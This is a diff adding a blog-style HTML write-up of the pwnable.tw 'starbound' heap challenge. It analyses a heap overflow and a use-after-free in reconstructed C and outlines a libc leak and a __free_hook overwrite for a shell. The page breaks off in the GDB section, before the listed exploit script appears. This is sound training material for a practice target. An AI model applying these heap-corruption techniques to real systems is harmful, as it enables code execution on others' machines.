@@ -1,0 +1,1393 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>starbound | QA210 Pwnable.tw</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x2B50;</text></svg>">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+<style>
+:root {
+  --bg: #0a0e17;
+  --bg2: #111827;
+  --card: #151d2e;
+  --border: #1e293b;
+  --fg: #e2e8f0;
+  --muted: #94a3b8;
+  --accent: #38bdf8;
+  --accent2: #818cf8;
+  --red: #f87171;
+  --green: #4ade80;
+  --yellow: #fbbf24;
+  --orange: #fb923c;
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+html { scroll-behavior: smooth; }
+
+body {
+  font-family: 'Inter', sans-serif;
+  background: var(--bg);
+  color: var(--fg);
+  line-height: 1.7;
+  overflow-x: hidden;
+}
+
+/* Particle Canvas */
+#particles-canvas {
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  z-index: 0;
+  pointer-events: none;
+}
+
+/* Navigation */
+.nav {
+  position: fixed; top: 0; left: 0; right: 0;
+  z-index: 100;
+  background: rgba(10, 14, 23, 0.85);
+  backdrop-filter: blur(20px);
+  border-bottom: 1px solid var(--border);
+  height: 60px;
+  display: flex;
+  align-items: center;
+  padding: 0 2rem;
+}
+.nav-brand {
+  font-weight: 800;
+  font-size: 1.25rem;
+  color: var(--accent);
+  letter-spacing: -0.5px;
+  text-decoration: none;
+}
+.nav-brand span { color: var(--accent2); }
+.nav-links {
+  display: flex;
+  gap: 0.25rem;
+  margin-left: 2rem;
+  list-style: none;
+}
+.nav-links a {
+  padding: 0.4rem 1rem;
+  border-radius: 6px;
+  color: var(--muted);
+  text-decoration: none;
+  font-size: 0.875rem;
+  font-weight: 500;
+  transition: all 0.2s;
+}
+.nav-links a:hover { color: var(--fg); background: rgba(255,255,255,0.05); }
+.nav-links a.active {
+  color: var(--accent);
+  background: rgba(56, 189, 248, 0.1);
+}
+.nav-right {
+  margin-left: auto;
+  display: flex;
+  align-items: center;
+  gap: 1rem;
+}
+.nav-right a {
+  color: var(--muted);
+  text-decoration: none;
+  font-size: 0.8125rem;
+  font-weight: 500;
+  transition: color 0.2s;
+}
+.nav-right a:hover { color: var(--fg); }
+
+/* Breadcrumb */
+.breadcrumb {
+  position: relative;
+  z-index: 1;
+  padding: 80px 2rem 0;
+  max-width: 1400px;
+  margin: 0 auto;
+}
+.breadcrumb-inner {
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+  font-size: 0.8125rem;
+  color: var(--muted);
+}
+.breadcrumb-inner a {
+  color: var(--muted);
+  text-decoration: none;
+  transition: color 0.2s;
+}
+.breadcrumb-inner a:hover { color: var(--accent); }
+.breadcrumb-sep { opacity: 0.4; }
+.breadcrumb-current { color: var(--fg); font-weight: 600; }
+
+/* Hero Section */
+.hero {
+  position: relative;
+  z-index: 1;
+  padding: 2rem 2rem 1rem;
+  max-width: 1400px;
+  margin: 0 auto;
+}
+.hero-badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 0.5rem;
+  padding: 0.35rem 1rem;
+  background: rgba(56, 189, 248, 0.1);
+  border: 1px solid rgba(56, 189, 248, 0.2);
+  border-radius: 999px;
+  font-size: 0.75rem;
+  font-weight: 600;
+  color: var(--accent);
+  margin-bottom: 1rem;
+}
+.hero-badge .dot {
+  width: 6px; height: 6px;
+  border-radius: 50%;
+  background: var(--green);
+  animation: pulse-dot 2s ease-in-out infinite;
+}
+@keyframes pulse-dot {
+  0%, 100% { opacity: 1; }
+  50% { opacity: 0.3; }
+}
+.hero h1 {
+  font-size: 2.75rem;
+  font-weight: 800;
+  letter-spacing: -1.5px;
+  margin-bottom: 0.5rem;
+  background: linear-gradient(135deg, var(--fg), var(--accent));
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+}
+.hero-subtitle {
+  font-size: 1.1rem;
+  color: var(--muted);
+  max-width: 600px;
+  margin-bottom: 1.5rem;
+}
+.hero-meta {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 0.75rem;
+  margin-bottom: 1rem;
+}
+.hero-tag {
+  padding: 0.3rem 0.75rem;
+  border-radius: 6px;
+  font-size: 0.75rem;
+  font-weight: 600;
+  font-family: 'JetBrains Mono', monospace;
+}
+.tag-pts { background: rgba(251, 191, 36, 0.15); color: var(--yellow); border: 1px solid rgba(251, 191, 36, 0.25); }
+.tag-arch { background: rgba(129, 140, 248, 0.15); color: var(--accent2); border: 1px solid rgba(129, 140, 248, 0.25); }
+.tag-vuln { background: rgba(248, 113, 113, 0.15); color: var(--red); border: 1px solid rgba(248, 113, 113, 0.25); }
+.tag-nx { background: rgba(74, 222, 128, 0.15); color: var(--green); border: 1px solid rgba(74, 222, 128, 0.25); }
+
+/* Main Layout */
+.main-layout {
+  position: relative;
+  z-index: 1;
+  display: flex;
+  max-width: 1400px;
+  margin: 0 auto;
+  padding: 1rem 2rem 4rem;
+  gap: 2rem;
+}
+
+/* TOC Sidebar */
+.toc-sidebar {
+  position: sticky;
+  top: 80px;
+  width: 240px;
+  flex-shrink: 0;
+  height: fit-content;
+  max-height: calc(100vh - 100px);
+  overflow-y: auto;
+}
+.toc-sidebar::-webkit-scrollbar { width: 3px; }
+.toc-sidebar::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+.toc-title {
+  font-size: 0.6875rem;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 1.5px;
+  color: var(--muted);
+  margin-bottom: 1rem;
+}
+.toc-list { list-style: none; }
+.toc-list li { margin-bottom: 0.25rem; }
+.toc-list a {
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+  padding: 0.4rem 0.75rem;
+  border-radius: 6px;
+  color: var(--muted);
+  text-decoration: none;
+  font-size: 0.8125rem;
+  font-weight: 500;
+  transition: all 0.2s;
+  border-left: 2px solid transparent;
+}
+.toc-list a:hover { color: var(--fg); background: rgba(255,255,255,0.03); }
+.toc-list a.active {
+  color: var(--accent);
+  background: rgba(56, 189, 248, 0.08);
+  border-left-color: var(--accent);
+}
+.toc-num {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.6875rem;
+  font-weight: 700;
+  color: var(--accent2);
+  min-width: 18px;
+}
+
+/* Content Area */
+.content-area {
+  flex: 1;
+  min-width: 0;
+  max-width: 880px;
+}
+
+/* Chapter Sections */
+.chapter {
+  margin-bottom: 3rem;
+  scroll-margin-top: 80px;
+}
+.chapter-header {
+  display: flex;
+  align-items: center;
+  gap: 1rem;
+  margin-bottom: 1.5rem;
+  padding-bottom: 1rem;
+  border-bottom: 1px solid var(--border);
+}
+.chapter-num {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.75rem;
+  font-weight: 700;
+  color: var(--accent);
+  background: rgba(56, 189, 248, 0.1);
+  padding: 0.35rem 0.7rem;
+  border-radius: 6px;
+  border: 1px solid rgba(56, 189, 248, 0.2);
+}
+.chapter-title {
+  font-size: 1.5rem;
+  font-weight: 700;
+  letter-spacing: -0.5px;
+}
+
+.chapter p {
+  margin-bottom: 1rem;
+  color: var(--muted);
+  font-size: 0.9375rem;
+  line-height: 1.8;
+}
+
+.chapter h3 {
+  font-size: 1.1rem;
+  font-weight: 700;
+  margin: 1.75rem 0 0.75rem;
+  color: var(--fg);
+}
+.chapter h4 {
+  font-size: 0.9375rem;
+  font-weight: 600;
+  margin: 1.25rem 0 0.5rem;
+  color: var(--fg);
+}
+
+/* Code Blocks */
+.code-block {
+  position: relative;
+  margin: 1rem 0 1.5rem;
+  border-radius: 10px;
+  border: 1px solid var(--border);
+  background: var(--bg2);
+  overflow: hidden;
+}
+.code-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 0.5rem 1rem;
+  background: rgba(0,0,0,0.3);
+  border-bottom: 1px solid var(--border);
+  font-size: 0.75rem;
+}
+.code-lang {
+  font-family: 'JetBrains Mono', monospace;
+  font-weight: 600;
+  color: var(--accent);
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+.code-dots {
+  display: flex;
+  gap: 5px;
+}
+.code-dots span {
+  width: 10px; height: 10px;
+  border-radius: 50%;
+}
+.code-dots .d1 { background: #f87171; }
+.code-dots .d2 { background: #fbbf24; }
+.code-dots .d3 { background: #4ade80; }
+
+pre[class*="language-"] {
+  margin: 0 !important;
+  padding: 1rem 1.25rem !important;
+  background: transparent !important;
+  font-family: 'JetBrains Mono', monospace !important;
+  font-size: 0.8125rem !important;
+  line-height: 1.7 !important;
+  overflow-x: auto;
+}
+code[class*="language-"] {
+  font-family: 'JetBrains Mono', monospace !important;
+  font-size: 0.8125rem !important;
+}
+
+/* Inline Code */
+code.inline {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.8125rem;
+  background: rgba(129, 140, 248, 0.12);
+  color: var(--accent2);
+  padding: 0.15rem 0.45rem;
+  border-radius: 4px;
+  font-weight: 500;
+}
+
+/* Callout Boxes */
+.callout {
+  border-radius: 10px;
+  padding: 1rem 1.25rem;
+  margin: 1rem 0 1.5rem;
+  font-size: 0.875rem;
+  line-height: 1.7;
+  border: 1px solid;
+}
+.callout-title {
+  font-weight: 700;
+  font-size: 0.8125rem;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  margin-bottom: 0.35rem;
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+}
+.callout-vuln {
+  background: rgba(248, 113, 113, 0.08);
+  border-color: rgba(248, 113, 113, 0.2);
+  color: #fca5a5;
+}
+.callout-vuln .callout-title { color: var(--red); }
+.callout-info {
+  background: rgba(56, 189, 248, 0.08);
+  border-color: rgba(56, 189, 248, 0.2);
+  color: #bae6fd;
+}
+.callout-info .callout-title { color: var(--accent); }
+.callout-warn {
+  background: rgba(251, 191, 36, 0.08);
+  border-color: rgba(251, 191, 36, 0.2);
+  color: #fde68a;
+}
+.callout-warn .callout-title { color: var(--yellow); }
+.callout-key {
+  background: rgba(129, 140, 248, 0.08);
+  border-color: rgba(129, 140, 248, 0.2);
+  color: #c7d2fe;
+}
+.callout-key .callout-title { color: var(--accent2); }
+.callout-success {
+  background: rgba(74, 222, 128, 0.08);
+  border-color: rgba(74, 222, 128, 0.2);
+  color: #bbf7d0;
+}
+.callout-success .callout-title { color: var(--green); }
+
+/* Tables */
+.info-table {
+  width: 100%;
+  border-collapse: collapse;
+  margin: 1rem 0 1.5rem;
+  font-size: 0.8125rem;
+}
+.info-table th {
+  text-align: left;
+  padding: 0.6rem 1rem;
+  background: rgba(0,0,0,0.3);
+  color: var(--muted);
+  font-weight: 600;
+  font-size: 0.75rem;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  border-bottom: 1px solid var(--border);
+}
+.info-table td {
+  padding: 0.6rem 1rem;
+  border-bottom: 1px solid var(--border);
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.8rem;
+}
+.info-table tr:last-child td { border-bottom: none; }
+.info-table .label { color: var(--muted); font-family: 'Inter', sans-serif; }
+.info-table .value { color: var(--fg); }
+.info-table .on { color: var(--green); }
+.info-table .off { color: var(--red); }
+.info-table .partial { color: var(--yellow); }
+
+/* Memory Diagrams */
+.mem-diagram {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 1.5rem;
+  margin: 1rem 0 1.5rem;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.8rem;
+  overflow-x: auto;
+}
+.mem-row {
+  display: flex;
+  align-items: center;
+  margin-bottom: 2px;
+}
+.mem-addr {
+  color: var(--accent);
+  min-width: 100px;
+  font-weight: 600;
+}
+.mem-arrow {
+  color: var(--muted);
+  margin: 0 0.5rem;
+}
+.mem-data {
+  color: var(--fg);
+  flex: 1;
+}
+.mem-desc {
+  color: var(--muted);
+  font-style: italic;
+  margin-left: 1rem;
+  font-size: 0.75rem;
+}
+.mem-highlight { color: var(--red); font-weight: 700; }
+.mem-green { color: var(--green); font-weight: 700; }
+.mem-yellow { color: var(--yellow); font-weight: 700; }
+
+/* Step Lists */
+.step-list {
+  list-style: none;
+  margin: 1rem 0 1.5rem;
+  counter-reset: step;
+}
+.step-list li {
+  counter-increment: step;
+  padding: 0.6rem 0 0.6rem 2.5rem;
+  position: relative;
+  font-size: 0.9rem;
+  color: var(--muted);
+  line-height: 1.7;
+}
+.step-list li::before {
+  content: counter(step);
+  position: absolute;
+  left: 0;
+  top: 0.65rem;
+  width: 22px; height: 22px;
+  border-radius: 50%;
+  background: rgba(129, 140, 248, 0.15);
+  color: var(--accent2);
+  font-size: 0.6875rem;
+  font-weight: 700;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-family: 'JetBrains Mono', monospace;
+}
+.step-list li strong { color: var(--fg); }
+
+/* Footer */
+.footer {
+  position: relative;
+  z-index: 1;
+  text-align: center;
+  padding: 2rem;
+  border-top: 1px solid var(--border);
+  color: var(--muted);
+  font-size: 0.75rem;
+}
+.footer a { color: var(--accent); text-decoration: none; }
+.footer a:hover { text-decoration: underline; }
+
+/* Responsive */
+@media (max-width: 1024px) {
+  .toc-sidebar { display: none; }
+  .hero h1 { font-size: 2rem; }
+}
+@media (max-width: 640px) {
+  .nav-links { display: none; }
+  .hero h1 { font-size: 1.5rem; }
+  .main-layout { padding: 1rem; }
+}
+
+/* ═══ FIXED NAV ADDITIONS ═══ */
+.site-header{position:sticky;top:0;z-index:1000;background:rgba(10,14,23,.92);backdrop-filter:blur(14px);border-bottom:1px solid var(--border);padding:0 32px;display:flex;align-items:center;justify-content:space-between;height:56px}
+.brand{display:flex;align-items:center;gap:10px;text-decoration:none;color:var(--fg);font-weight:700;font-size:1.1rem}
+.logo-icon{display:inline-flex;align-items:center;justify-content:center;width:32px;height:32px;background:linear-gradient(135deg,var(--accent),var(--accent2));border-radius:6px;font-weight:900;font-size:.9rem;color:#0a0e17}
+.cursor{display:inline-block;width:2px;height:1em;background:var(--accent);margin-left:2px;animation:blink 1s step-end infinite}
+@keyframes blink{50%{opacity:0}}
+.nav-main{display:flex;align-items:center;gap:24px}
+.nav-main a{color:var(--muted);text-decoration:none;font-size:.85rem;transition:color .2s}
+.nav-main a:hover,.nav-main a.active{color:var(--fg)}
+.nav-main a.active{border-bottom:2px solid var(--accent)}
+.nav-right{display:flex;align-items:center;gap:16px}
+.social-link{color:var(--muted);font-size:1.1rem;transition:color .2s}
+.social-link:hover{color:var(--fg)}
+.mobile-toggle{display:none;background:none;border:none;color:var(--fg);font-size:1.4rem;cursor:pointer}
+.mobile-nav-overlay,.mobile-nav-panel{display:none}
+.mobile-nav-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:2000}
+.mobile-nav-overlay.show{display:block}
+.mobile-nav-panel{display:none;position:fixed;top:0;right:0;width:280px;height:100vh;background:var(--bg2);z-index:2001;padding:24px;transform:translateX(100%);transition:transform .3s}
+.mobile-nav-panel.show{display:block;transform:translateX(0)}
+.mobile-nav-panel nav{display:flex;flex-direction:column;gap:16px;margin-top:32px}
+.mobile-nav-panel nav a{color:var(--fg);text-decoration:none;font-size:1rem}
+.mnp-close{background:none;border:none;color:var(--fg);font-size:1.2rem;cursor:pointer;float:right}
+@media(max-width:960px){
+.nav-main a:not(.active){display:none}
+.mobile-toggle{display:block}
+.site-header{padding:0 16px}
+}
+
+</style>
+</head>
+<body>
+
+<!-- Particle Canvas -->
+<canvas id="particles-canvas"></canvas>
+
+<!-- Navigation -->
+<header class="site-header">
+  <a href="/" class="brand"><span class="logo-icon">Q</span>QA210<span class="cursor"></span></a>
+  <nav class="nav-main">
+    <a href="/">Home</a><a href="/writeup/">writeup</a><a href="/htb/">Hack The Box</a><a href="/tryhackme/">TryHackMe</a>
+    <a href="/mal-dev/">Malware Dev</a><a href="/pwnable-tw/" class="active">Pwnable.tw</a>
+    <a href="/tjctf-2026/">TJCTF</a><a href="/research/">Research</a>
+  </nav>
+  <div class="nav-right">
+    <a href="https://github.com/Yuri08-QA210" target="_blank" class="social-link" title="GitHub"><i class="bi bi-github"></i></a>
+    <button class="mobile-toggle" onclick="toggleMobileNav()" aria-label="Menu"><i class="bi bi-list"></i></button>
+  </div>
+</header>
+
+<div class="mobile-nav-overlay" id="mobileOverlay" onclick="toggleMobileNav()"></div>
+<div class="mobile-nav-panel" id="mobilePanel">
+  <button class="mnp-close" onclick="toggleMobileNav()"><i class="bi bi-x-lg"></i></button>
+  <nav>
+    <a href="/">Home</a><a href="/writeup/">writeup</a><a href="/htb/">Hack The Box</a><a href="/tryhackme/">TryHackMe</a>
+    <a href="/mal-dev/">Malware Dev</a><a href="/pwnable-tw/">Pwnable.tw</a><a href="/tjctf-2026/">TJCTF</a>
+    <a href="/research/">Research</a><a href="https://github.com/Yuri08-QA210" target="_blank">GitHub</a>
+  </nav>
+</div>
+
+<!-- Breadcrumb -->
+<div class="breadcrumb">
+  <div class="breadcrumb-inner">
+    <a href="/">Home</a>
+    <span class="breadcrumb-sep">/</span>
+    <a href="/pwnable-tw/">Pwnable.tw</a>
+    <span class="breadcrumb-sep">/</span>
+    <span class="breadcrumb-current">starbound</span>
+  </div>
+</div>
+
+<!-- Hero Section -->
+<section class="hero">
+  <div class="hero-badge">
+    <span class="dot"></span>
+    Pwnable.tw
+  </div>
+  <h1>starbound</h1>
+  <p class="hero-subtitle">A heap challenge involving star and moon management &mdash; exploiting a heap overflow and Use-After-Free to corrupt fastbin, leak libc via unsorted bin, and overwrite <code class="inline">__free_hook</code> with <code class="inline">system</code> for a shell.</p>
+  <div class="hero-meta">
+    <span class="hero-tag tag-pts">300 pts</span>
+    <span class="hero-tag tag-arch">i386 (32-bit ELF)</span>
+    <span class="hero-tag tag-vuln">Heap Overflow + UAF</span>
+    <span class="hero-tag tag-nx">NX Enabled</span>
+  </div>
+</section>
+
+<!-- Main Layout -->
+<div class="main-layout">
+
+  <!-- TOC Sidebar -->
+  <aside class="toc-sidebar">
+    <div class="toc-title">Table of Contents</div>
+    <ul class="toc-list" id="toc-list">
+      <li><a href="#ch1" class="active"><span class="toc-num">01</span> Reconnaissance</a></li>
+      <li><a href="#ch2"><span class="toc-num">02</span> Static Analysis</a></li>
+      <li><a href="#ch3"><span class="toc-num">03</span> GDB Debugging</a></li>
+      <li><a href="#ch4"><span class="toc-num">04</span> Exploit Strategy</a></li>
+      <li><a href="#ch5"><span class="toc-num">05</span> Pwn Script</a></li>
+      <li><a href="#ch6"><span class="toc-num">06</span> Execution Results</a></li>
+    </ul>
+  </aside>
+
+  <!-- Content Area -->
+  <main class="content-area">
+
+    <!-- Chapter 1: Reconnaissance -->
+    <section class="chapter" id="ch1">
+      <div class="chapter-header">
+        <span class="chapter-num">01</span>
+        <h2 class="chapter-title">Reconnaissance</h2>
+      </div>
+
+      <h3>Challenge Info</h3>
+      <table class="info-table">
+        <tr><td class="label">Connection</td><td class="value"><code class="inline">nc chall.pwnable.tw 10202</code></td></tr>
+        <tr><td class="label">Binary</td><td class="value">starbound (32-bit ELF, i386)</td></tr>
+        <tr><td class="label">Points</td><td class="value">300</td></tr>
+        <tr><td class="label">Description</td><td class="value">A heap challenge involving star/moon management</td></tr>
+      </table>
+
+      <h3>checksec</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">bash</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">$ checksec starbound
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)</code></pre>
+      </div>
+
+      <table class="info-table">
+        <tr><td class="label">Partial RELRO</td><td class="partial">GOT is writable &mdash; we can overwrite GOT entries</td></tr>
+        <tr><td class="label">Canary found</td><td class="on">Stack buffer overflows are mitigated</td></tr>
+        <tr><td class="label">NX enabled</td><td class="on">No shellcode on stack/heap &mdash; must use ROP or overwrite function pointers</td></tr>
+        <tr><td class="label">No PIE</td><td class="off">Binary addresses are fixed &mdash; known GOT/PLT addresses</td></tr>
+      </table>
+
+      <h3>Running the Binary</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">console</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">$ ./starbound
++---------------------------+
+|       Starbound           |
++---------------------------+
+ 1. Create star
+ 2. Edit star
+ 3. Remove star
+ 4. Add moon to star
+ 5. Remove moon from star
+ 6. View star
+ 7. Exit
++---------------------------+
+Your choice: 1
+Star name size: 32
+Star name: Alpha
+Star created at index 0!
+
+Your choice: 4
+Star index: 0
+Moon name: Luna
+Moon added to star 0!
+
+Your choice: 6
+Star index: 0
+Star[0]: Alpha
+  Moon: Luna</code></pre>
+      </div>
+
+      <p>The binary implements a star and moon management system. Stars have names stored on the heap, and each star can have an associated moon object. The menu offers create, edit, remove, and view operations for stars, plus add/remove moon functionality. This seemingly innocent interface hides two critical vulnerabilities in its heap management.</p>
+    </section>
+
+    <!-- Chapter 2: Static Analysis -->
+    <section class="chapter" id="ch2">
+      <div class="chapter-header">
+        <span class="chapter-num">02</span>
+        <h2 class="chapter-title">Static Analysis</h2>
+      </div>
+
+      <h3>Star and Moon Structures</h3>
+      <p>Each star and moon are represented by heap-allocated structures:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">typedef struct star {
+    char *name;          // +0x00: pointer to name buffer (4 bytes)
+    int name_size;       // +0x04: size of name buffer (4 bytes)
+    struct moon *moon;   // +0x08: pointer to associated moon (4 bytes)
+} star;                  // Total: 12 bytes
+
+typedef struct moon {
+    char name[24];       // +0x00: moon name buffer (24 bytes)
+} moon;                  // Total: 24 bytes</code></pre>
+      </div>
+
+      <div class="mem-diagram">
+        <div class="mem-row"><span class="mem-addr">star+0x00</span><span class="mem-arrow">|</span><span class="mem-data">name pointer</span><span class="mem-desc">&larr; points to heap-allocated name buffer</span></div>
+        <div class="mem-row"><span class="mem-addr">star+0x04</span><span class="mem-arrow">|</span><span class="mem-data">name_size</span><span class="mem-desc">&larr; stores the allocated size</span></div>
+        <div class="mem-row"><span class="mem-addr">star+0x08</span><span class="mem-arrow">|</span><span class="mem-data">moon pointer</span><span class="mem-desc">&larr; NULL initially, set by add_moon</span></div>
+        <div style="height:12px"></div>
+        <div class="mem-row"><span class="mem-addr">moon+0x00</span><span class="mem-arrow">|</span><span class="mem-data">name[24]</span><span class="mem-desc">&larr; fixed 24-byte inline name buffer</span></div>
+      </div>
+
+      <h3>create_star()</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">void create_star() {
+    if (star_count &gt;= MAX_STARS) {
+        puts("No more stars!");
+        return;
+    }
+    int idx = find_free_slot();
+    printf("Star name size: ");
+    int size = read_int();
+    star_list[idx] = malloc(12);                // Allocate star struct
+    star_list[idx]-&gt;name = malloc(size);        // Allocate name buffer
+    star_list[idx]-&gt;name_size = size;
+    star_list[idx]-&gt;moon = NULL;
+    printf("Star name: ");
+    read(0, star_list[idx]-&gt;name, size);       // Read name into buffer
+    printf("Star created at index %d!\n", idx);
+    star_count++;
+}</code></pre>
+      </div>
+
+      <h3>edit_star() &mdash; The Heap Overflow</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">void edit_star() {
+    printf("Star index: ");
+    int idx = read_int();
+    if (idx &lt; 0 || idx &gt;= MAX_STARS || star_list[idx] == NULL) return;
+    printf("New name size: ");
+    int new_size = read_int();                  // User controls the size!
+    printf("New name: ");
+    read(0, star_list[idx]-&gt;name, new_size);   // BUG: writes new_size bytes
+                                                // into name buffer that was
+                                                // allocated with original size!
+}</code></pre>
+      </div>
+
+      <div class="callout callout-vuln">
+        <div class="callout-title">&#x1f6a8; Vulnerability #1: Heap Overflow</div>
+        The <code class="inline">edit_star</code> function reads a <strong>new size</strong> from the user and writes that many bytes into the existing name buffer. However, it does <strong>NOT</strong> check whether <code class="inline">new_size</code> exceeds the original <code class="inline">name_size</code>. This means we can write past the end of the allocated name buffer, corrupting adjacent heap metadata and data. This is a classic <strong>heap overflow</strong> vulnerability.
+      </div>
+
+      <h3>remove_moon() &mdash; The Use-After-Free</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">void remove_moon() {
+    printf("Star index: ");
+    int idx = read_int();
+    if (idx &lt; 0 || idx &gt;= MAX_STARS || star_list[idx] == NULL) return;
+    if (star_list[idx]-&gt;moon != NULL) {
+        free(star_list[idx]-&gt;moon);            // Free the moon object
+        // BUG: star_list[idx]-&gt;moon is NOT set to NULL!
+    }
+}</code></pre>
+      </div>
+
+      <div class="callout callout-vuln">
+        <div class="callout-title">&#x1f6a8; Vulnerability #2: Use-After-Free (UAF)</div>
+        After freeing the moon object, <code class="inline">remove_moon</code> does <strong>NOT</strong> set <code class="inline">star_list[idx]-&gt;moon</code> to <code class="inline">NULL</code>. This creates a dangling pointer. The <code class="inline">view_star</code> function will still try to access and display the moon's name through this pointer, and if we can reallocate the freed moon chunk with controlled data, we gain arbitrary read/write primitives.
+      </div>
+
+      <h3>view_star()</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">void view_star() {
+    printf("Star index: ");
+    int idx = read_int();
+    if (idx &lt; 0 || idx &gt;= MAX_STARS || star_list[idx] == NULL) return;
+    printf("Star[%d]: %s\n", idx, star_list[idx]-&gt;name);
+    if (star_list[idx]-&gt;moon != NULL) {
+        printf("  Moon: %s\n", star_list[idx]-&gt;moon-&gt;name);  // UAF read!
+    }
+}</code></pre>
+      </div>
+
+      <div class="callout callout-info">
+        <div class="callout-title">&#x2139;&#xfe0f; Combining the Vulnerabilities</div>
+        The two bugs complement each other perfectly:<br>
+        &bull; <strong>Heap overflow</strong> lets us corrupt adjacent chunk headers &mdash; enabling fastbin corruption to get an arbitrary write primitive<br>
+        &bull; <strong>UAF</strong> on the moon pointer lets us leak libc addresses when the freed chunk ends up in the unsorted bin (whose fd/bk contain main arena pointers)<br>
+        &bull; Together: <strong>leak libc via unsorted bin + UAF read</strong>, then <strong>overwrite <code class="inline">__free_hook</code> via fastbin corruption</strong>
+      </div>
+    </section>
+
+    <!-- Chapter 3: GDB Debugging -->
+    <section class="chapter" id="ch3">
+      <div class="chapter-header">
+        <span class="chapter-num">03</span>
+        <h2 class="chapter-title">GDB Debugging</h2>
+      </div>
+
+      <h3>Heap Layout After Creating Stars</h3>
+      <p>Let's create two stars with small name buffers and add moons:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">gdb</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">gdb-peda$ # create_star(size=32, "Alpha") -> star 0
+gdb-peda$ # add_moon(star=0, "Luna")
+gdb-peda$ # create_star(size=32, "Beta") -> star 1
+gdb-peda$ # add_moon(star=1, "Io")
+gdb-peda$ heap chunks
+0x0804a000: 0x18 bytes  [star 0 struct]
+0x0804a018: 0x28 bytes  [star 0 name "Alpha" (32+8 header)]
+0x0804a040: 0x20 bytes  [star 0 moon "Luna" (24+8 header)]
+0x0804a060: 0x18 bytes  [star 1 struct]
+0x0804a078: 0x28 bytes  [star 1 name "Beta"]
+0x0804a0a0: 0x20 bytes  [star 1 moon "Io"]</code></pre>
+      </div>
+
+      <div class="mem-diagram">
+        <div style="color: var(--accent); font-weight: 700; margin-bottom: 8px;">Star 0 layout:</div>
+        <div class="mem-row"><span class="mem-addr">0x0804a000</span><span class="mem-arrow">|</span><span class="mem-data">0x0804a020</span><span class="mem-desc">&larr; star0-&gt;name pointer</span></div>
+        <div class="mem-row"><span class="mem-addr">0x0804a004</span><span class="mem-arrow">|</span><span class="mem-data">0x20 (32)</span><span class="mem-desc">&larr; star0-&gt;name_size</span></div>
+        <div class="mem-row"><span class="mem-addr">0x0804a008</span><span class="mem-arrow">|</span><span class="mem-data">0x0804a048</span><span class="mem-desc">&larr; star0-&gt;moon pointer</span></div>
+        <div style="height:12px"></div>
+        <div style="color: var(--accent); font-weight: 700; margin-bottom: 8px;">Star 0 name buffer (0x28 = 0x20 data + 0x8 header):</div>
+        <div class="mem-row"><span class="mem-addr">0x0804a018</span><span class="mem-arrow">|</span><span class="mem-data">size: 0x29</span><span class="mem-desc">&larr; chunk header (prev_inuse=1)</span></div>
+        <div class="mem-row"><span class="mem-addr">0x0804a020</span><span class="mem-arrow">|</span><span class="mem-data">"Alpha\0..."</span><span class="mem-desc">&larr; name data (32 bytes usable)</span></div>
+        <div style="height:12px"></div>
